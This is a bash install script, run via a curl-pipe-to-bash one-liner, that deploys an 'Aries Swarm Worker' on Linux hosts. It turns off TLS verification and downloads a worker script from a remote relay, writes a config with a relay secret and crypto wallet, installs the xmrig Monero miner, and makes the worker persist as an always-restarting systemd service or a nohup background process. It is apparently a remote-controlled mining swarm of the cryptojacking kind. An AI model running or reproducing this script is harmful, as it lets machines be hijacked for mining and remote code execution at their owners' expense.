#!/bin/bash
# ============================================================================
# Aries Swarm Worker — Linux One-Liner Install Script
# Usage: curl -sL http://YOUR-IP:3333/api/deploy/worker-linux.sh | bash
# ============================================================================

set -e

RELAY_URL="https://gateway.doomtrader.com:9700"
RELAY_SECRET="aries-swarm-jdw-2026"
SOL_WALLET="5PoVdFPRPkSNM9PoGjqbMbFKWqP1YuezgVERdD3bsKhF"
REFERRAL_CODE="jdw-aries"
INSTALL_DIR="/opt/aries-worker"
SERVICE_NAME="aries-worker"

echo "╔══════════════════════════════════════════╗"
echo "║   Aries Swarm Worker — Linux Installer   ║"
echo "╚══════════════════════════════════════════╝"
echo ""

# --- Check root ---
if [ "$(id -u)" -ne 0 ]; then
  echo "[!] Running without root. Some steps may fail."
  echo "[!] Re-run with: sudo bash"
fi

# --- Install Node.js if missing ---
if ! command -v node &>/dev/null; then
  echo "[*] Installing Node.js..."
  if command -v apt-get &>/dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - 2>/dev/null
    apt-get install -y nodejs 2>/dev/null || {
      echo "[*] Trying snap..."
      snap install node --classic 2>/dev/null || true
    }
  elif command -v yum &>/dev/null; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - 2>/dev/null
    yum install -y nodejs 2>/dev/null
  elif command -v dnf &>/dev/null; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - 2>/dev/null
    dnf install -y nodejs 2>/dev/null
  elif command -v apk &>/dev/null; then
    apk add --no-cache nodejs npm 2>/dev/null
  fi
fi

if ! command -v node &>/dev/null; then
  echo "[!] Failed to install Node.js. Please install manually."
  exit 1
fi

echo "[+] Node.js $(node -v) found"

# --- Create install directory ---
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# --- Download worker-linux.js from relay ---
echo "[*] Downloading worker from relay..."
curl -sSLk "$RELAY_URL/api/usb-swarm/worker-linux.js" -o worker-linux.js || {
  echo "[!] Failed to download worker. Trying alternative..."
  curl -sSLk "$RELAY_URL/api/deploy/worker.js" -o worker-linux.js || {
    echo "[!] Download failed."
    exit 1
  }
}

# --- Write env.json ---
HOSTNAME=$(hostname)
cat > env.json <<ENVEOF
{
  "relayUrl": "$RELAY_URL",
  "secret": "$RELAY_SECRET",
  "model": "xmrig-mining",
  "hostname": "$HOSTNAME",
  "wallet": "$SOL_WALLET",
  "referralCode": "$REFERRAL_CODE"
}
ENVEOF

echo "[+] Config written to env.json"

# --- Install xmrig if missing ---
if ! command -v xmrig &>/dev/null && [ ! -f "$INSTALL_DIR/xmrig" ]; then
  echo "[*] Installing xmrig..."
  ARCH=$(uname -m)
  XMRIG_VER="6.21.1"
  if [ "$ARCH" = "x86_64" ]; then
    XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VER}/xmrig-${XMRIG_VER}-linux-x64.tar.gz"
  elif [ "$ARCH" = "aarch64" ]; then
    XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VER}/xmrig-${XMRIG_VER}-linux-arm64.tar.gz"
  else
    echo "[!] Unsupported architecture: $ARCH"
    XMRIG_URL=""
  fi

  if [ -n "$XMRIG_URL" ]; then
    curl -sSL "$XMRIG_URL" -o /tmp/xmrig.tar.gz
    tar xzf /tmp/xmrig.tar.gz -C /tmp/
    find /tmp -name "xmrig" -type f -exec cp {} "$INSTALL_DIR/xmrig" \;
    chmod +x "$INSTALL_DIR/xmrig"
    rm -f /tmp/xmrig.tar.gz
    echo "[+] xmrig installed"
  fi
fi

# --- Create systemd service ---
if [ -d /etc/systemd/system ] && [ "$(id -u)" -eq 0 ]; then
  echo "[*] Creating systemd service..."
  cat > /etc/systemd/system/${SERVICE_NAME}.service <<SVCEOF
[Unit]
Description=Aries Swarm Worker
After=network.target

[Service]
Type=simple
WorkingDirectory=$INSTALL_DIR
ExecStart=$(which node) $INSTALL_DIR/worker-linux.js
Restart=always
RestartSec=10
Environment=NODE_TLS_REJECT_UNAUTHORIZED=0

[Install]
WantedBy=multi-user.target
SVCEOF

  systemctl daemon-reload
  systemctl enable ${SERVICE_NAME}
  systemctl start ${SERVICE_NAME}
  echo "[+] Service started and enabled"
else
  echo "[*] No systemd or not root. Starting in background..."
  nohup node worker-linux.js > /var/log/aries-worker.log 2>&1 &
  echo "[+] Worker started (PID: $!)"
fi

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║        Installation Complete! ✓          ║"
echo "║  Worker: $HOSTNAME"
echo "║  Relay:  $RELAY_URL"
echo "╚══════════════════════════════════════════╝"
